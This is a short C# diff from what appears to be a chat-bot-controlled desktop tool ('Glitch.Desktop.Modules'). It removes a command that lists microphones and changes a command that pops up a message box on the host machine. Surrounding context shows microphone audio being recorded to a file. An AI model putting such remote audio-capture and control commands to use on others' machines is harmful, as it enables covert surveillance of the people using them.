@@ -10,6 +10,7 @@ using ImageFormat = System.Drawing.Imaging.ImageFormat;
 using System.Net;
 using NAudio.Wave;
 
+
 namespace Glitch.Desktop.Modules
 {
     // Modules must be public and inherit from an IModuleBase
@@ -129,28 +130,11 @@ namespace Glitch.Desktop.Modules
                 writer.Write(e.Buffer, 0, e.BytesRecorded);
             }
         }
-        [Command("microlist")]
-        public async Task MicroListAsync()
-        {
-            int waveInDevices = WaveIn.DeviceCount;
-            if (WaveIn.DeviceCount == 0)
-            {
-                await ReplyAsync("No microphones!");
-            }
-            else
-            {
-                for (int waveInDevice = 0; waveInDevice < waveInDevices; waveInDevice++)
-                {
-                    WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(waveInDevice);
-                    await ReplyAsync($"Device {waveInDevice}: {deviceInfo.ProductName}, {deviceInfo.Channels} channels");
-                }
-            }
-        }
         [Command("messagebox")]
-        public async Task MessageBoxAsync(string name, string value)
+        public Task MessageBoxAsync(string name, string value)
         {
             MessageBox((IntPtr)0, value, name, 0);
-            await ReplyAsync("User closed the message box!");
+            return ReplyAsync("Created the messagebox!");
         }
 
     }
